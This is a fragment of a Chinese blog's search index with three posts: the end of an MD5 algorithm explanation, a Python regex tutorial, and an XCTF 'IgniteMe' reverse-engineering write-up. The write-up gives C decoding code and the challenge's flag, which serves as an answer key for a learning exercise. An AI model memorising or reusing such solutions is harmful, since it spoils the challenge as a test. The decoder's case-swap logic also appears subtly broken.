FF(a,b,c,d,M[8],7,0x698098d8) ; FF(d,a,b,c,M[9],12,0x8b44f7af) ; FF(c,d,a,b,M[10],17,0xffff5bb1); FF(b,c,d,a,M[11],22,0x895cd7be); FF(a,b,c,d,M[12],7,0x6b901122) ; FF(d,a,b,c,M[13],12,0xfd987193); FF(c,d,a,b,M[14],17,0xa679438e); FF(b,c,d,a,M[15],22,0x49b40821); GG(a,b,c,d,M[1],5,0xf61e2562) ; GG(d,a,b,c,M[6],9,0xc040b340) ; GG(c,d,a,b,M[11],14,0x265e5a51); GG(b,c,d,a,M[0],20,0xe9b6c7aa) ; GG(a,b,c,d,M[5],5,0xd62f105d) ; GG(d,a,b,c,M[10],9,0x02441453) ; GG(c,d,a,b,M[15],14,0xd8a1e681); GG(b,c,d,a,M[4],20,0xe7d3fbc8) ; GG(a,b,c,d,M[9],5,0x21e1cde6) ; GG(d,a,b,c,M[14],9,0xc33707d6) ; GG(c,d,a,b,M[3],14,0xf4d50d87) ; GG(b,c,d,a,M[8],20,0x455a14ed) ; GG(a,b,c,d,M[13],5,0xa9e3e905) ; GG(d,a,b,c,M[2],9,0xfcefa3f8) ; GG(c,d,a,b,M[7],14,0x676f02d9) ; GG(b,c,d,a,M[12],20,0x8d2a4c8a); HH(a,b,c,d,M[5],4,0xfffa3942) ; HH(d,a,b,c,M[8],11,0x8771f681) ; HH(c,d,a,b,M[11],16,0x6d9d6122); HH(b,c,d,a,M[14],23,0xfde5380c); HH(a,b,c,d,M[1],4,0xa4beea44) ; HH(d,a,b,c,M[4],11,0x4bdecfa9) ; HH(c,d,a,b,M[7],16,0xf6bb4b60) ; HH(b,c,d,a,M[10],23,0xbebfbc70); HH(a,b,c,d,M[13],4,0x289b7ec6) ; HH(d,a,b,c,M[0],11,0xeaa127fa) ; HH(c,d,a,b,M[3],16,0xd4ef3085) ; HH(b,c,d,a,M[6],23,0x04881d05) ; HH(a,b,c,d,M[9],4,0xd9d4d039) ; HH(d,a,b,c,M[12],11,0xe6db99e5); HH(c,d,a,b,M[15],16,0x1fa27cf8); HH(b,c,d,a,M[2],23,0xc4ac5665) ; II(a,b,c,d,M[0],6,0xf4292244) ; II(d,a,b,c,M[7],10,0x432aff97) ; II(c,d,a,b,M[14],15,0xab9423a7); II(b,c,d,a,M[5],21,0xfc93a039) ; II(a,b,c,d,M[12],6,0x655b59c3) ; II(d,a,b,c,M[3],10,0x8f0ccc92) ; II(c,d,a,b,M[10],15,0xffeff47d); II(b,c,d,a,M[1],21,0x85845dd1) ; II(a,b,c,d,M[8],6,0x6fa87e4f) ; II(d,a,b,c,M[15],10,0xfe2ce6e0); II(c,d,a,b,M[6],15,0xa3014314) ; II(b,c,d,a,M[13],21,0x4e0811a1); II(a,b,c,d,M[4],6,0xf7537e82) ; II(d,a,b,c,M[11],10,0xbd3af235); II(c,d,a,b,M[2],15,0x2ad7d2bb) ; II(b,c,d,a,M[9],21,0xeb86d391) ; A = A+AA; B = B+BB; C = C+CC; D = D+DD （5）输出 当512位分组都运算完毕，A、B、C、D的连级将被输出为MD5散列的结果。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式的学习]]></title>
    <url>%2F2019%2F09%2F10%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[1、re.match函数re.match尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。 函数语法：1、re.match(pattren, string, flags=0) 说明：pattern:匹配的正则表达式。 string:要匹配的字符串。 flags:标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。匹配成功re.match方法返回一个匹配的对象，否则返回none。可以使用group(num)或group()匹配对象函数来获取匹配表达式。 group(num=0):匹配的整个表达式的字符串，group()可以一次输入多个组号，在这种情况下它将返回一个包含那些所对应值的元组。 groups():返回一个包含所有小组字符串的元组，从1到所含的小组号。实例： 123import reprint(re.match('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.match('com', 'www.runoob.com')) # 不在起始位置匹配 运行结果： 12(0, 3)None 实例： 12345678910111213#!/usr/bin/pythonimport re line = "Cats are smarter than dogs" matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I) if matchObj: print "matchObj.group() : ", matchObj.group() print "matchObj.group(1) : ", matchObj.group(1) print "matchObj.group(2) : ", matchObj.group(2)else: print "No match!!" 运行结果: 123matchObj.group() : Cats are smarter than dogsmatchObj.group(1) : CatsmatchObj.group(2) : smarter 2、re.search方法re.search扫描整个字符串并返回第一个成功的匹配。 函数语法： re.search(p,attern, string, flags=0)实例： 123456#!/usr/bin/python# -*- coding: UTF-8 -*- import reprint(re.search('www', 'www.runoob.com').span()) # 在起始位置匹配print(re.search('com', 'www.runoob.com').span()) # 不在起始位置匹配 结果： 12(0, 3)(11, 14) re.match与re.search的区别re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 3、检索和替换re.sub(pattren, repl, string, count=0, flags=0) 说明：repl：替换的字符串，也可以为一个函数。 count：模式匹配后替换的最大次数，默认0表示替换所有的匹配。1234567891011121314#!/usr/bin/python# -*- coding: UTF-8 -*- import re phone = "2004-959-559 # 这是一个国外电话号码" # 删除字符串中的 Python注释 num = re.sub(r'#.*$', "", phone)print "电话号码是: ", num # 删除非数字(-)的字符串 num = re.sub(r'\D', "", phone)print "电话号码是 : ", num 结果： 12电话号码是: 2004-959-559 电话号码是 : 2004959559 findall 在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。 注意： match 和 search 是匹配一次 findall 匹配所有。语法格式为： findall(string[, pos[, endpos]]) 参数： string : 待匹配的字符串。 pos : 可选参数，指定字符串的起始位置，默认为 0。 endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。实例： 12345678910# -*- coding:UTF8 -*- import re pattern = re.compile(r'\d+') # 查找数字result1 = pattern.findall('runoob 123 google 456')result2 = pattern.findall('run88oob123google456', 0, 10) print(result1)print(result2) 结果： 12['123', '456']['88', '12'] re.finditer 和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。 re.finditer(pattern, string, flags=0)实例： 1234import reit = re.finditer(r"\d+","12a32bc43jf3") for match in it: print (match.group() ) 结果： 123412 32 43 3 4、正则表达式修饰符 - 可选标志re.I：使匹配对大小写不敏感 re.L：做本地化识别（locale-aware）匹配 re.M：多行匹配，影响 ^ 和 $ re.S：使 . 匹配包括换行在内的所有字符 re.U：根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B. re.X：该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。6、正则表达式模式^：匹配字符串的开头$：匹配字符串的末尾。.：匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。[…]：用来表示一组字符,单独列出：[amk] 匹配’a’，’m’或’k’[^…]：不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。re：匹配0个或多个的表达式。re+：匹配1个或多个的表达式。re?：匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式re{ n}：精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配 “food” 中的两个 o。re{ n,}：匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于 “o+”。”o{0,}” 则等价于”o“。re{ n, m}：匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式a| b：匹配a或b(re)：对正则表达式分组并记住匹配的文本(?imx)：正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。(?-imx)：正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。(?: re)：类似 (…), 但是不表示一个组(?imx: re)：在括号中使用i, m, 或 x 可选标志(?-imx: re)：在括号中不使用i, m, 或 x 可选标志(?#…)：注释.(?= re)：前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。(?! re)：前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功(?&gt; re)：匹配的独立模式，省去回溯。\w：匹配字母数字及下划线\W：匹配非字母数字及下划线\s：匹配任意空白字符，等价于 [\t\n\r\f].\S：匹配任意非空字符\d：匹配任意数字，等价于 [0-9].\D：匹配任意非数字\A：匹配字符串开始\Z：匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。\z：匹配字符串结束\G：匹配最后匹配完成的位置。\b：匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’：可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。\B：匹配非单词边界。’er\B’ 能匹配 “verb”中的’er’，但不能匹配 “never” 中的 ‘er’。\n, \t, 等. ：匹配一个换行符。匹配一个制表符。等\1…\9：匹配第n个分组的内容。\10：匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。]]></content>
  </entry>
  <entry>
    <title><![CDATA[一道RE学习：IngiteMe]]></title>
    <url>%2F2019%2F09%2F10%2FIgniteMe%E9%80%86%E5%90%91%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、RE-IgniteMe这道题来自XCTF社区，比较简单。 题目链接：https://adworld.xctf.org.cn/media/task/attachments/fac4d1290e604fdfacbbe06fd1a5ca39.exe2、解题思路下载好后我们发现这是一个EXE文件，先拖入PEID查壳看看，发现没有壳。直接运行，题目要求你输入flag，我们用IDA打开，进入_main函数，按F5 我们可以发现一串“Congratulations！”字符，这里应该就是关键判断，双击它sub_4011C0函数，进入查看 可以看到末尾的关键字符串，从后往前推，它的主要算法是异或和加减以及大小写字母之间的转换，我用C语言写了段代码进行解码，代码如下： 12345678910111213141516171819202122int main()&#123; int i; char str[32] = "GONDPHyGjPEKruv&#123;&#123;pj]X@rF"; int num[32] = &#123;0x0D, 0x13,0x17,0x11,2,1, 0x20,0x1D,0x0C,2,0x19,0x2F,0x17,0x2B,0x24, 0x1F,0x1E,0x16,9,0x0F,0x15,0x27,0x13,0x26, 0x0A,0x2F,0x1E,0x1A,0x2D,0x0C,0x22,4&#125;; for(i = 0; str[i] !='\0'; i++) &#123; str[i] = ((str[i]^num[i])-72)^0x55; if(str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') str[i] -= 32; if(str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') str[i] += 32; &#125; printf("EIS&#123;%s&#125;\n",str); return 0;&#125; 运行后得出flag： 1EIS&#123;wadx_tdgk_aihc_ihkn_pjlm&#125; 3、总结逆向过程需要耐心和不断地尝试。]]></content>
      <tags>
        <tag>XCTF-RE</tag>
      </tags>
  </entry>
</search>
